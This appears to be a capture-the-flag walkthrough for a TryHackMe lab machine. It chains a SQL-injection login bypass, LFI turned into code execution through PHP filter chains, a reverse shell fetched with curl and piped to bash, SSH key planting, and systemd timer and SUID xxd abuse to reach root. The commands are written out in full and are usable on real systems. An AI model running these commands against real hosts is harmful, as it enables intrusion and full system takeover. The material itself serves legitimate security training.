---
tags:
  - THM
  - Linux
  - Easy
  - SQLi
  - LFI
  - RCE
  - Systemd
  - Sudo
  - SUID
---
https://tryhackme.com/room/cheesectfv10/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.35.190 cheese.thm
```
# Scanning
The scan `nmap -p- --open -sS -vvv -n -Pn cheese.thm` reveals that many ports are open, giving false positives likely due to a security configuration. So, we will have to test manually.
# Discovery
There is a [login panel](http://cheese.thm/login.php) running on port 80.
# Exploitation
## SQL injection
Hydra revealed many successful SQL injection queries like **`'||2=2#`**:
```bash
hydra -L /usr/share/seclists/Fuzzing/login_bypass.txt -p password cheese.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed." -t 64
```
## LFI to RCE
Admin panel is vulnerable to local file inclusion via `file` parameter: http://cheese.thm/secret-script.php?file=supersecretadminpanel.html.

The readable files are very restricted, so we will use PHP wrappers and filters to get from [LFI to RCE](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html). First, clone a [repository](https://github.com/tucommenceapousser/php_filter_chain_generator) to generate **PHP filter chains**:
```console
$ git clone https://github.com/tucommenceapousser/php_filter_chain_generator

$ cd php_filter_chain_generator/
```
Setup Python server with a **reverse shell script**:
```console
$ echo 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' > rev.sh

$ sudo python3 -m http.server 80
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Generate **malicious PHP filter chain (payload)** to download the **malicious reverse shell script** and execute it. After the web request, a reverse shell connection should be established as **user www-data**:
```console
$ payload=$(python3 php_filter_chain_generator.py --chain '<?php `curl -s <ATTACKER-IP>/rev.sh | bash` ?>' | grep '^php')

$ curl -s "http://cheese.thm/secret-script.php?file=$payload"
```
# Post-Exploitation
## User Migration
Found writable **SSH config file** inside the home directory of **user comte**:
```console
$ ls -l /home/comte/.ssh/authorized_keys

-rw-rw-rw- 1 comte comte 91 Apr 18 03:21 /home/comte/.ssh/authorized_keys
```
In the attacker's machine, generate an **SSH key pair**:
```bash
ssh-keygen -t ed25519 -f ./cheese_key
```
Copy and add your **public key** `cheese_key.pub` to `/home/comte/.ssh/authorized_keys`.

Then, log in without a password as **user comte** using your **private key**:
```bash
ssh -i cheese_key comte@cheese.thm
```
Get the **user flag**:
```bash
cat /home/comte/user.txt
```
## Timer Process
Can enable and disable timer process `exploit.timer` using **sudo privileges**:
```console
$ sudo -l

User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```
The timer copies `/usr/bin/xxd` binary into `/opt/xxd` but with **SUID permissions**:
```console
$ find / -name exploit.timer -o -name exploit.service 2>/dev/null | xargs ls -l
-rw-r--r-- 1 root root 141 Mar 29  2024 /etc/systemd/system/exploit.service
-rwxrwxrwx 1 root root  87 Mar 29  2024 /etc/systemd/system/exploit.timer

$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target

$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```
Fixed `/etc/systemd/system/exploit.timer` with `OnBootSec=5s`. Then, restarted the timer:
```bash
sudo /bin/systemctl restart exploit.timer
```
## Abusing SUID Binary
Found **SUID binary** `/opt/xxd`:
```console
$ find / -perm -4000 2>/dev/null | grep -v '^/snap'

/opt/xxd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```
Copy **SSH config file** `authorized_keys` from **user comte** to the home directory of **user root**, following [GTFOBins instructions](https://gtfobins.github.io/gtfobins/xxd/):
```bash
cat /home/comte/.ssh/authorized_keys | /opt/xxd | /opt/xxd -r - /root/.ssh/authorized_keys
```
Login as **user root**:
```
ssh -i cheese_key root@cheese.thm
```
Get the **root flag**:
```bash
cat /root/root.txt
```